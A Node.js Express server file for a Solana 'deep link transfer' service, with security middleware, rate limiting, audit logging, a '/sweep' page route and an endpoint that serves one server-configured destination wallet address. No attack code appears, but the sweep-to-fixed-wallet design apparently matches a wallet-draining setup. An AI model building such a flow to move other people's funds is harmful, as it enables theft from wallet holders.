/**
 * Main Server for Solana Deep Link Transfer System
 * Implements comprehensive security measures, rate limiting, and monitoring
 */

const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const compression = require('compression');
const morgan = require('morgan');
const path = require('path');
const rateLimit = require('express-rate-limit');
const { body, validationResult } = require('express-validator');

// Load environment variables
require('dotenv').config();

// Import services and middleware
const SignatureService = require('./services/signature-service');
const NonceManager = require('./services/nonce-manager');
const AuditLogger = require('./services/audit-logger');
const SecurityMiddleware = require('./middleware/security');
const ValidationMiddleware = require('./middleware/validation');

// Import routes
const linksRoutes = require('./routes/links');
const verificationRoutes = require('./routes/verification');
const transactionRoutes = require('./routes/transactions');
const monitoringRoutes = require('./routes/monitoring');

class SecureSolanaServer {
    constructor() {
        this.app = express();
        this.port = process.env.PORT || 3000;
        this.environment = process.env.NODE_ENV || 'development';

        // Initialize services
        this.signatureService = new SignatureService();
        this.nonceManager = new NonceManager();
        this.auditLogger = new AuditLogger();

        // Security configuration
        this.securityConfig = {
            maxRequestSize: '10mb',
            rateLimitWindow: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 900000, // 15 minutes
            rateLimitMax: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 100,
            corsOrigins: process.env.CORS_ORIGINS?.split(',') || ['http://localhost:3000'],
            helmetConfig: {
                contentSecurityPolicy: {
                    directives: {
                        defaultSrc: ["'self'"],
                        scriptSrc: ["'self'", "'unsafe-inline'"],
                        styleSrc: ["'self'", "'unsafe-inline'"],
                        connectSrc: ["'self'", "https://*.solana.com", "https://api.coingecko.com"],
                        imgSrc: ["'self'", "data:", "https:"],
                        fontSrc: ["'self'"],
                        objectSrc: ["'none'"],
                        mediaSrc: ["'self'"],
                        frameSrc: ["'none'"],
                    },
                },
                crossOriginEmbedderPolicy: false,
                hsts: {
                    maxAge: 31536000,
                    includeSubDomains: true,
                    preload: true
                }
            }
        };

        this.initializeMiddleware();
        this.initializeRoutes();
        this.initializeErrorHandling();
        this.setupGracefulShutdown();
    }

    /**
     * Initialize security and utility middleware
     */
    initializeMiddleware() {
        // Trust proxy for rate limiting behind reverse proxy
        this.app.set('trust proxy', 1);

        // Compression
        this.app.use(compression());

        // Security headers
        this.app.use(helmet(this.securityConfig.helmetConfig));

        // CORS configuration
        this.app.use(cors({
            origin: (origin, callback) => {
                // Allow requests with no origin (mobile apps, etc.)
                if (!origin) return callback(null, true);

                if (this.securityConfig.corsOrigins.includes(origin)) {
                    return callback(null, true);
                }

                const msg = 'The CORS policy for this site does not allow access from the specified Origin.';
                return callback(new Error(msg), false);
            },
            credentials: true,
            methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
            allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
            maxAge: 86400 // 24 hours
        }));

        // Request parsing
        this.app.use(express.json({
            limit: this.securityConfig.maxRequestSize,
            strict: true
        }));

        this.app.use(express.urlencoded({
            extended: false,
            limit: this.securityConfig.maxRequestSize
        }));

        // Logging
        this.app.use(morgan(this.environment === 'production' ? 'combined' : 'dev'));

        // Custom security middleware
        this.app.use(SecurityMiddleware.securityHeaders);
        this.app.use(SecurityMiddleware.requestSanitization);
        this.app.use(SecurityMiddleware.ipWhitelist);

        // Rate limiting
        this.setupRateLimiting();

        // Request ID and timing
        this.app.use((req, res, next) => {
            req.requestId = this.generateRequestId();
            req.startTime = Date.now();
            res.setHeader('X-Request-ID', req.requestId);
            next();
        });

        // Audit logging
        this.app.use(async (req, res, next) => {
            await this.auditLogger.logRequest(req);
            next();
        });
    }

    /**
     * Setup rate limiting with different tiers
     */
    setupRateLimiting() {
        // General API rate limit
        const generalLimiter = rateLimit({
            windowMs: this.securityConfig.rateLimitWindow,
            max: this.securityConfig.rateLimitMax,
            message: {
                error: 'Too many requests from this IP, please try again later.',
                retryAfter: Math.ceil(this.securityConfig.rateLimitWindow / 1000 / 60)
            },
            standardHeaders: true,
            legacyHeaders: false,
            handler: async (req, res) => {
                await this.auditLogger.logSecurityEvent({
                    type: 'rate_limit_exceeded',
                    ip: req.ip,
                    userAgent: req.get('User-Agent'),
                    endpoint: req.path
                });

                res.status(429).json({
                    error: 'Rate limit exceeded',
                    retryAfter: Math.ceil(this.securityConfig.rateLimitWindow / 1000)
                });
            }
        });

        // Strict rate limit for sensitive operations
        const strictLimiter = rateLimit({
            windowMs: this.securityConfig.rateLimitWindow,
            max: 10, // Much lower limit
            message: {
                error: 'Too many sensitive operations, please try again later.',
                retryAfter: Math.ceil(this.securityConfig.rateLimitWindow / 1000 / 60)
            },
            skip: (req) => {
                // Skip for whitelisted IPs if needed
                return false;
            }
        });

        this.app.use('/api/', generalLimiter);
        this.app.use('/api/verification/', strictLimiter);
        this.app.use('/api/transactions/', strictLimiter);
    }

    /**
     * Initialize API routes
     */
    initializeRoutes() {
        // Health check (no rate limiting)
        this.app.get('/health', (req, res) => {
            res.json({
                status: 'healthy',
                timestamp: new Date().toISOString(),
                environment: this.environment,
                uptime: process.uptime(),
                version: process.env.npm_package_version || '1.0.0'
            });
        });

        // Client IP endpoint
        this.app.get('/api/client-ip', (req, res) => {
            res.json({
                ip: req.ip,
                forwarded: req.get('X-Forwarded-For'),
                realIp: req.get('X-Real-IP')
            });
        });

        // Wallet configuration endpoint
        this.app.get('/api/wallet-config', (req, res) => {
            res.json({
                destinationWallet: process.env.DESTINATION_WALLET_ADDRESS || null,
                isConfigured: !!process.env.DESTINATION_WALLET_ADDRESS
            });
        });

        // API routes
        this.app.use('/api/links', linksRoutes);
        this.app.use('/api/verification', verificationRoutes);
        this.app.use('/api/transactions', transactionRoutes);
        this.app.use('/api/monitoring', monitoringRoutes);

        // Audit endpoints
        this.app.post('/api/audit/:type',
            ValidationMiddleware.validateAuditLog,
            async (req, res) => {
                try {
                    await this.auditLogger.logEvent(req.params.type, req.body);
                    res.json({ success: true });
                } catch (error) {
                    console.error('Audit logging failed:', error);
                    res.status(500).json({ error: 'Audit logging failed' });
                }
            }
        );

        // Serve static files (frontend)
        this.app.use(express.static(path.join(__dirname, '../frontend'), {
            maxAge: this.environment === 'production' ? '1d' : '0',
            setHeaders: (res, filePath) => {
                // Security headers for static files
                if (filePath.endsWith('.html')) {
                    res.setHeader('X-Content-Type-Options', 'nosniff');
                    res.setHeader('X-Frame-Options', 'DENY');
                }
            }
        }));

        // Sweep page route
        this.app.get('/sweep', (req, res) => {
            res.sendFile(path.join(__dirname, '../frontend/sweep.html'));
        });

        // SPA fallback
        this.app.get('*', (req, res) => {
            res.sendFile(path.join(__dirname, '../frontend/index.html'));
        });
    }

    /**
     * Initialize error handling
     */
    initializeErrorHandling() {
        // Validation error handler
        this.app.use((err, req, res, next) => {
            if (err.type === 'entity.parse.failed') {
                return res.status(400).json({
                    error: 'Invalid JSON in request body'
                });
            }

            if (err.type === 'entity.too.large') {
                return res.status(413).json({
                    error: 'Request too large'
                });
            }

            next(err);
        });

        // 404 handler
        this.app.use((req, res) => {
            res.status(404).json({
                error: 'Endpoint not found',
                path: req.path,
                method: req.method,
                timestamp: new Date().toISOString()
            });
        });

        // General error handler
        this.app.use(async (err, req, res, next) => {
            const errorId = this.generateRequestId();

            // Log error
            console.error(`Error ${errorId}:`, err);

            // Log security-related errors
            if (err.name === 'ValidationError' || err.status === 403) {
                await this.auditLogger.logSecurityEvent({
                    type: 'security_error',
                    errorId,
                    error: err.message,
                    ip: req.ip,
                    userAgent: req.get('User-Agent'),
                    endpoint: req.path
                });
            }

            // Response
            const response = {
                error: this.environment === 'production' ?
                    'Internal server error' :
                    err.message,
                errorId,
                timestamp: new Date().toISOString()
            };

            if (this.environment !== 'production') {
                response.stack = err.stack;
            }

            res.status(err.status || 500).json(response);
        });

        // Unhandled promise rejections
        process.on('unhandledRejection', (reason, promise) => {
            console.error('Unhandled Rejection at:', promise, 'reason:', reason);
            // Don't exit process, log and continue
        });

        // Uncaught exceptions
        process.on('uncaughtException', (error) => {
            console.error('Uncaught Exception:', error);
            // Log the error and gracefully shutdown
            this.gracefulShutdown('UNCAUGHT_EXCEPTION');
        });
    }

    /**
     * Setup graceful shutdown
     */
    setupGracefulShutdown() {
        const signals = ['SIGTERM', 'SIGINT', 'SIGUSR2'];

        signals.forEach(signal => {
            process.on(signal, () => {
                console.log(`Received ${signal}, starting graceful shutdown`);
                this.gracefulShutdown(signal);
            });
        });
    }

    /**
     * Graceful shutdown procedure
     */
    async gracefulShutdown(signal) {
        console.log(`Graceful shutdown initiated by ${signal}`);

        try {
            // Stop accepting new connections
            this.server?.close(() => {
                console.log('HTTP server closed');
            });

            // Cleanup services
            await Promise.all([
                this.signatureService?.cleanup(),
                this.nonceManager?.cleanup(),
                this.auditLogger?.cleanup()
            ]);

            console.log('Cleanup completed, exiting');
            process.exit(0);

        } catch (error) {
            console.error('Error during graceful shutdown:', error);
            process.exit(1);
        }
    }

    /**
     * Generate unique request ID
     */
    generateRequestId() {
        return Math.random().toString(36).substring(2, 15) +
               Math.random().toString(36).substring(2, 15);
    }

    /**
     * Start the server
     */
    start() {
        this.server = this.app.listen(this.port, () => {
            console.log(`
🚀 Solana Deep Link Transfer Server Started
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🌐 Server: http://localhost:${this.port}
🔧 Environment: ${this.environment}
🛡️  Security: Enhanced
📊 Rate Limiting: Active
🔍 Audit Logging: Enabled

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Security Features:
✅ Helmet.js security headers
✅ CORS protection
✅ Rate limiting with tiers
✅ Request sanitization
✅ Signature verification
✅ Replay attack prevention
✅ Comprehensive audit logging
✅ Graceful shutdown handling

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            `);

            // Log startup
            this.auditLogger.logEvent('server_startup', {
                port: this.port,
                environment: this.environment,
                timestamp: new Date().toISOString(),
                pid: process.pid
            }).catch(console.error);
        });

        // Server error handling
        this.server.on('error', (error) => {
            if (error.code === 'EADDRINUSE') {
                console.error(`❌ Port ${this.port} is already in use`);
            } else {
                console.error('❌ Server error:', error);
            }
            process.exit(1);
        });

        return this.server;
    }

    /**
     * Get app instance for testing
     */
    getApp() {
        return this.app;
    }
}

// Start server if this file is run directly
if (require.main === module) {
    const server = new SecureSolanaServer();
    server.start();
}

module.exports = SecureSolanaServer;